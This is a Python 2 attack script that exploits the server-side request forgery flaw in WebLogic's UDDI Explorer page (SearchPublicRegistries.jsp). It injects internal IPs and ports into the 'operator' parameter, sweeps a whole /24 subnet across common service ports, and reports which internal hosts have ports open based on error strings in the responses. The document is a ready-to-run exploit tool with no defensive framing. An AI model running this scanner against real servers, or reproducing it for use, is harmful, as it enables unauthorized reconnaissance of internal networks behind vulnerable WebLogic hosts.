#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import sys
import time
import thread
import logging
import requests

def banner():
    print """
        +----------------------------------------+
        +               Weblogic SSRF                         +
        +                           by whois                     +
        +----------------------------------------+
        =========================================="""

def scan(url,ip_str):
  
    ports = ('21','22','23','53','80','135','139','443','445','1433','1521','3306','3389','8080','7001','7002','8000','8080','11211',)
    for port in ports:
        exp_url = "{0}/uddiexplorer/SearchPublicRegistries.jsp?operator=http://{1}:{2}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search".format(url,ip_str,port)
        try:
     
            response = requests.get(exp_url, timeout=14, verify=False)
    
            re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
            re_sult2 = re.findall('but could not connect',response.content)

            if len(re_sult1)!=0 and len(re_sult2)==0:
                print '[+]'+ip_str+':'+port
        except Exception, e:
            pass

def find_ip(url,ip_prefix):
    for i in range(1,256):
        ip = '{0}.{1}'.format(ip_prefix,i)
        thread.start_new_thread(scan, (url,ip,))
        time.sleep(5)

if __name__ == "__main__":
    banner()
    if len(sys.argv) != 3:
        print "[!] python weblogic_ssrf.py target_url ip"
        exit(-1)
    url = sys.argv[1]
    ip = sys.argv[2]
    ip_prefix = '.'.join(ip.split('.')[:-1])
    find_ip(url,ip_prefix)
